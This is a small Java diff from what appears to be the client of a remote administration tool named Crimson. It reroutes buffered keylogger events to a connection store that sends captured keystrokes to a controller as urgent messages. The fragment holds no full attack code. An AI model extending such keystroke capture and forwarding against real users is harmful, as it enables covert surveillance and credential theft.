@@ -19,6 +19,7 @@ package com.subterranean_security.crimson.client.net;
 
 import java.util.ArrayList;
 
+import com.subterranean_security.crimson.client.ClientStore;
 import com.subterranean_security.crimson.client.modules.Keylogger;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
@@ -37,7 +38,7 @@ public enum ClientCommands {
 		}
 
 		for (EV_KEvent k : buffer) {
-			ClientRouter.route(Message.newBuilder().setUrgent(true).setEvKevent(k));
+			ClientStore.Connections.route(Message.newBuilder().setUrgent(true).setEvKevent(k));
 		}
 	}
 
